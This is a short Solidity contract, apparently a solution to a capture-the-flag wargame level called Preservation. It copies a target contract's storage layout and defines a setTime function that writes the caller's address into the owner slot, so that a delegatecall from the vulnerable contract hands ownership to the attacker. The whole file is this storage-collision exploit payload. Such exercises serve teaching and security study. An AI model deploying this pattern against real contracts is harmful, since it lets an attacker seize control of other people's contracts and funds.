// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationSolved {

  // public library contracts
  address public timeZone1Library; // SLOT 0
  address public timeZone2Library; // SLOT 1
  address public owner;            // SLOT 2
  uint storedTime;                 // SLOT 3

  // update the owner slot
  function setTime(uint _time) public {
    owner = msg.sender;
  }

}